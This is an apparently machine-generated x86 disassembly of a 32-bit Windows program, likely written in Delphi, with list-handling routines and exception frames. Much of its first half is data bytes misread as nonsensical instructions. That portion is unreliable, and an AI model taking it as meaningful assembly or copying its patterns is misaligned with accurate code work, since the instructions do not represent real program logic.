sbb [ ecx ] al
or al 0x0
add [ eax ] al
rcl [ esi ] 0x41
add [ esp + esi + 0x40 ] dl
add [ eax + 0x40 ] ah
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax - 0x5fffbec2 ] dl
aas
inc ecx
add [ eax - 0x43ffbec1 ] ch
inc ecx
add al dh
inc eax
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] dl
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
sbb dl 0x7
inc ebx
insb
popad
jae r-xdata
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add ah ah
dec ebx
jae r-xdata
inc ecx
add [ eax ] bl
dec esp
inc ecx
add [ eax + 0x800414d ] al
dec esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebx + 0x74 ] 0x38746e65
sbb [ ecx ] al
pop es
adc eax 0x746e4954
jb r-xdata
add [ eax ] al
add [ eax + 0x3000411a ] dh
outsb
jae r-xdata
dec [ ebx + 0x4118e8c0 ]
add [ eax ] al
add bh bh
add [ eax + 0x19 ] ch
inc ecx
add [ eax + 0x4119 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x19 ] bh
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add al bl
xor [ eax ] eax
adc al 0x32
imul ebp [ esi + 0x67 ] 0x7473694c
rcr [ edx ] 0x41
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add al cl
dec esi
inc ecx
add ah bh
dec edi
inc ecx
add al dl
inc ecx
inc ecx
add ah dh
inc ecx
inc ecx
add [ eax ] bl
inc edx
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ ebp + eax * 2 + 0x41 ] dh
add [ eax + 0x46 ] ch
inc ecx
add [ eax + 0x48 ] dh
inc ecx
add ah bh
dec eax
inc ecx
add al dl
dec ecx
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ edx + ecx * 2 ] al
inc ecx
add [ edx + ecx * 2 ] dh
inc ecx
add [ eax + 0x3400414a ] cl
dec ebx
inc ecx
add ah cl
dec esp
inc ecx
add [ ecx * 2 + 0x4db80041 ] ah
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + ebx + 0x41 ] ah
add [ eax + eax ] cl
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
or [ esi + 0x41 ] cl
mov [ ecx ] bl
jpe r-xdata
imul esi [ ebx + 0x74 ] 0xfc746e65
pop ss
inc ecx
add [ edi + edx ] dh
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
push ebx
je r-xdata
popad
add [ eax ] dl
push edi
inc ecx
add [ eax ] ch
push edi
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add al cl
push edi
inc ecx
add [ eax + ebx * 2 + 0x41 ] cl
add [ edi ] al
push esp
push ebx
je r-xdata
les edx [ esi + 0x41 ]
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
test [ ecx ] bl
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax + edx * 2 ] bh
push esp
xor al 0x40
outsb
jae r-xdata
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax - 0x5fffbebf ] ah
aas
inc ecx
add al bl
inc ebx
inc ecx
add al dl
inc edx
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ esi + eax * 2 + 0x41 ] bl
add [ eax + 0x2a ] ch
inc eax
add [ esi + eax * 2 + 0x41 ] ah
add [ esi + eax * 2 + 0x4be40041 ] bh
inc ecx
add [ eax ] dl
add [ eax ] al
add al al
push ss
inc ecx
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
inc eax
jae r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
sbb [ ecx + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx ] dh
inc ecx
add [ eax ] cl
add [ eax ] al
add [ ebx + ebx + 0x41 ] dl
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add ah bl
pop esp
inc ecx
add ah al
push esi
inc ecx
add [ eax ] cl
pop ebx
inc ecx
add [ ebx + ebx * 2 ] bl
inc ecx
add [ edx + ebx * 2 + 0x5acc0041 ] bh
inc ecx
add al cl
push edi
inc ecx
add ah bl
pop edx
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
jb r-xdata
jae r-xdata
push esp
push ebx
je r-xdata
sbb [ ecx ] al
xor al 0x17
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax + r-xdata ] dl
insd
dec ebp
insd
outsd
jb r-xdata
insd
mov [ ecx + eax * 2 ] ds
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000411c ] ch
add [ eax ] al
add ah ah
sbb al [ ecx ]
push esp
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add ah al
push esi
inc ecx
add [ eax ] dl
push edi
inc ecx
add [ eax ] ch
push edi
inc ecx
add [ eax ] bl
pop ebp
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x5d ] dl
inc ecx
add [ eax + ebx * 2 + 0x41 ] cl
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
popad
dec esp
pop eax
inc ecx
je r-xdata
add ah bl
pop edx
inc ecx
add [ 0x6e614854 ] cl
insb
insd
mov al [ 0x411b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx + 0x80041 ] bh
add [ eax ] al
in al 0x1a
inc ecx
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add ah al
push esi
inc ecx
add [ eax ] cl
pop ebx
inc ecx
add [ ebx + ebx * 2 ] bl
inc ecx
add [ edx + ebx * 2 + 0x5acc0041 ] bh
inc ecx
add al cl
push edi
inc ecx
popad
inc eax
add ah al
push esi
inc ecx
add [ ebp + 0x1b300040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx + 0x41 ] cl
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x54004010 ]
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
add [ eax ] al
add [ eax + ebx + 0x34540041 ] bl
inc eax
inc ecx
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
imul ebp [ esi + 0x67 ] 0x19889073
inc ecx
add [ eax - 0x27ffbec1 ] ah
push eax
jae r-xdata
jns r-xdata
push ebx
je r-xdata
push ebx
push ebx
add [ esi + ebx * 2 + 0x41 ] al
add [ 0x6d654d54 ] cl
inc ecx
add [ eax + ebx * 2 + 0x41 ] cl
add [ ebx + 0x4119acc0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
les edx [ esi + 0x41 ]
je r-xdata
outsd
jb r-xdata
insd
popad
insd
or [ 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ 0x140041 ] bl
add [ eax ] al
inc eax
sbb al 0x41
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ ebp + ebx * 2 + 0x41 ] dh
add ah al
push esi
inc ecx
add [ eax ] bl
pop esi
inc ecx
add [ eax ] ch
push edi
inc ecx
add [ eax ] bl
pop ebp
inc ecx
add al dl
pop esi
inc ecx
add [ eax + 0x5d ] dl
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
add [ eax ] dl
push edi
inc ecx
add [ eax ] ch
push edi
inc ecx
add [ eax ] bl
pop ebp
inc ecx
add [ eax + 0x5d500041 ] cl
inc ecx
add [ eax + ebx * 2 + 0x41 ] cl
add [ edi ] cl
push esp
push edx
jae r-xdata
popad
insd
mov eax eax
test [ 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x1800411d ]
add [ eax ] al
add [ eax + 0x1c ] al
inc ecx
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax + 0x41 ] dl
add ah al
push esi
inc ecx
add al dl
inc edx
inc ecx
add ah ah
push edx
inc ecx
add [ eax ] bl
push ebx
inc ecx
add [ ebx + edx * 2 ] bl
inc ecx
add [ eax ] ah
push ebx
inc ecx
add [ esi + eax * 2 + 0x54940041 ] bh
inc ecx
add al dh
push esp
inc ecx
add ah al
push ebp
inc ecx
add [ eax ] cl
dec esi
inc ecx
add [ eax ] al
push esi
inc ecx
add [ esi + edx * 2 + 0x41 ] dh
add [ eax - 0x5bffbeb0 ] bl
push eax
inc ecx
add [ eax ] bl
inc edx
inc ecx
add [ eax + 0x51 ] al
inc ecx
add [ eax - 0x13ffbeaf ] al
push ecx
inc ecx
add [ eax + 0x46 ] ch
inc ecx
add [ ebx + edx * 2 + 0x41 ] bh
add ah bh
dec eax
inc ecx
add al dl
dec ecx
inc ecx
add [ eax - 0x37ffbead ] bh
push ebx
inc ecx
add [ edx + ecx * 2 ] dh
inc ecx
add [ eax + 0x3400414a ] cl
dec ebx
inc ecx
add ah cl
dec esp
inc ecx
add [ ecx * 2 + 0x4db80041 ] ah
inc ecx
add [ eax ] cl
push ecx
inc ecx
add [ ecx + edx * 2 ] ah
inc ecx
add [ esp + edx * 2 ] bl
inc ecx
add [ edx + edx * 2 + 0x41 ] ch
add [ esi + edx * 2 ] ch
inc ecx
add [ esi + edx * 2 ] bh
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
fadd [ ebx + 0x41 ]
outsb
dec ecx
je r-xdata
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
inc ebx
inc ecx
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
sbb [ edx ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
sbb al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x1a
inc ecx
add [ eax ] dh
sub_411ec8
mov [ 0x411e ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg edx eax
and [ ecx ] al
jl r-xdata
shr al 0x20
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
and [ ecx ] al
or al 0x0
add [ eax ] al
in al 0x6d
inc eax
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ edi ] al
inc ebp
push esp
push 0x64616572
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax + 0x54004010 ] ah
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add ah ch
pushad
inc ecx
add [ ecx ] dl
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ esi ] al
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x41205890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4120 ] al
jb r-xdata
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edi + 0x61140041 ] ch
inc ecx
add [ eax + ebp * 2 ] cl
inc ecx
add [ eax + 0x68 ] al
inc ecx
add [ ebx + ebp * 2 + 0x41 ] dl
add [ eax ] dh
imul eax [ ecx ] sub_418a5c
push eax
imul eax [ ecx ] sub_418b2c
adc al 0x8b
inc ecx
add [ eax + 0xe004178 ] dl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] dl
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
add [ eax ] al
test al 0x1f
inc ecx
add [ esp + esi + 0x40 ] dl
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ecx + edx + 0x34540040 ] dl
inc eax
add [ eax ] bl
push esi
inc eax
add [ esi + edx * 2 ] ah
inc eax
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ esi + edx * 2 ] dh
inc eax
add al bl
xor [ eax ] eax
xor [ edi - 0x6097ffbf ] bl
inc ecx
add al dl
lahf
inc ecx
add [ eax ] bh
mov al [ 0xffffffffa0bc0041 ]
inc ecx
add [ eax ] ah
mov eax [ 0xffffffffa3200041 ]
inc ecx
add [ ebx ] ch
inc ecx
add [ eax ] bh
mov [ 0xffffffffa3440041 ] eax
inc ecx
add [ eax - 0x5d ] dl
inc ecx
add ah cl
mov [ 0x540e0041 ] eax
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x1f
cwde
pop ds
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x800411f ] bl
add [ eax ] al
add [ eax + 0x54004010 ] ah
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add ah dh
inc ecx
add [ esp + edx * 2 ] cl
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7c004120 ] dl
add [ eax ] al
add [ eax + 0x5400411f ] ch
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] 0x41
add [ eax ] al
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add ah dh
pop ds
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4120f1
and [ ecx ] al
or cl [ esi ]
push esp
inc ebx
outsd
insd
jo r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
or [ gs : ecx ] ah
inc ecx
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
inc esp
and al 0x4
aam 0xe9
push edi
jpe r-xdata
jns r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
add ah cl
inc ebp
and [ ecx ] eax
push ebx
and [ ecx ] eax
pop ebp
and [ ecx ] eax
cmp eax 0x67004121
and [ ecx ] eax
jne r-xdata
pop es
inc ebx
insb
popad
jae r-xdata
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e7da95
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
pop ebp
retn 0x4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
0x2c004121 0x0
add [ eax ] al
add [ eax ] al
add [ ebx + 0x412230c0 ] cl
add [ esi + 0x4121 ] ah
add [ eax ] al
add [ eax + 0x22 ] ah
inc ecx
add ah ah
and al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc ecx
add [ edi + 0x21 ] bh
inc ecx
add [ edx ] al
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
mov esp 0xd8004031
xor [ eax ] eax
cmp al 0x94
inc ecx
add [ eax + 0x6800413f ] ah
xchg edi eax
inc ecx
add [ esi + edi - 0x67bfffbf ] bh
inc ecx
add [ edi + edx * 4 ] cl
inc ecx
add [ eax - 0x68 ] dl
inc ecx
add [ eax - 0x67 ] cl
inc ecx
add [ eax - 0x65 ] bh
inc ecx
add [ eax - 0x68 ] ah
inc ecx
add [ eax - 0x68 ] bl
inc ecx
add [ eax - 0xfffbe65 ] al
xchg ebx eax
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al dh
and [ ecx ] al
or [ eax ] al
add [ eax ] al
adc [ eax ] al
std
inc ecx
add ah dl
and al [ ecx ]
xor [ eax ] al
add [ eax ] al
rcl [ esi ] 0x41
add [ eax - 0x65 ] ah
inc ecx
add [ eax + 0x34 ] ah
inc eax
add [ esp + edx * 4 + 0x34680041 ] dh
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ esp + edx * 4 ] bh
dec [ ebx - 0x3f7c3340 ]
fsubr st1
mov ebx 0x8300007a
inc esp
and al 0x4
fmul [ ebx - 0x74fbdbbc ]
add bh bh
sub_4124bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405dac
pop edi
pop esi
pop ebx
retn
sub_4124e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405d90
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41250c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405db4
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412604
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_413918
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403438
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403438
test al al
je r-xdata
sub_412664
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_412604
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_412604
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403438
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4126d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4031f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_4137bc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_412750
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
mov eax [ esi + 0x4 ]
call sub_403224
mov eax [ esi + 0x8 ]
call sub_403224
mov eax [ esi + 0xc ]
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_412790
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_413918
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_403188
test al al
jne r-xdata
sub_4127f0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_413918
mov edx eax
mov eax ebp
call sub_403438
test al al
jne r-xdata
sub_412834
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4128cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403174
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041c0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_412790
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4137bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4128d6
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
call sub_403998
sub_4128f4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_404f50
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_412914
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413918
mov edx edi
call sub_4128f4
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413918
mov edx edi
call sub_4128f4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413808
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_4128f4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413808
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4129b8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_413918
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_4127f0
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_412a04
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
